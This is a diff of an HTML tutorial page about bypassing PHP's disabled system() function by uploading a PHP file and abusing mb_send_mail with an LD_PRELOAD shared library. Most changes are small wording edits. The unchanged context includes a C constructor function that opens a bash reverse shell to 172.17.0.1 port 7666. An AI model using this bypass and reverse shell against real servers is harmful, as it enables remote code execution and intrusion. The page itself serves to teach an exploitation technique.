@@ -42,6 +42,7 @@
 
             <h2 class="section-label">Prequesties</h2>
             <b><p>The PHP application should be vulnerable for unrestricted file upload, permitting any file type to be uploaded on the server.</p></b>
+            <b><p>You must know the server path where the uploaded files are stored. You can find this if debug mode is enabled or using a php script to find out where the uploaded files are stored</p></b>
 
             <h2 class="section-label">The file upload form</h2>
             <p>Lets upload the php files. which executes the command <code>id</code> on the host machine/server</p>
@@ -51,7 +52,7 @@
                 
             </div>
 
-            <p>At this point we know system function is disabled, we can check this using <code> &lt;?php phpinfo(); ?&gt;</code></p>
+            <p>At this point we know system function is disabled, we can check this by executing this php <code> &lt;?php phpinfo(); ?&gt;</code></p>
 
             <div class="image-placeholder">
                 <img src="assets/images/phpinfo.png" alt="Radare2 disassembly output">
@@ -68,7 +69,7 @@
             mb_send_mail — Send encoded mail</p>
 
             <p>You can find the Docs <a href="https://www.php.net/manual/en/function.mb-send-mail.php" style="color: var(--accent);">Here</a></p>
-            <p>mb_send_mail is a PHP function used to send emails with multi-byte encoding. It takes 4 argument</p>
+            <p>mb_send_mail is a PHP function used to send emails with multi-byte encoding.</p>
 
 
             <pre class="terminal-body" style="background: #000; color: #fff;">mb_send_mail(
@@ -88,7 +89,7 @@
 
         <div><span style="color: #569cd6;">attribute</span> ((<span style="color: #dcdcaa;">constructor</span>)) <span style="color: #569cd6;">void</span> <span style="color: #dcdcaa;">exploit_init</span>(<span style="color: #569cd6;">void</span>) {</div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">unsetenv</span>(<span style="color: #ce9178;">"LD_PRELOAD"</span>);</div> <div style="padding-left: 20px;"><span style="color: #dcdcaa;">system</span>(<span style="color: #ce9178;">"bash -c 'bash -i >& /dev/tcp/172.17.0.1/7666 0>&1'"</span>);</div> <div>}</div> </div>
             <p></p>
-            <p>Change the IP and Port.</p>
+           
 
 
             <pre class="terminal-body" style="background: #000; color: #fff;">xen.c  xen.so</pre>
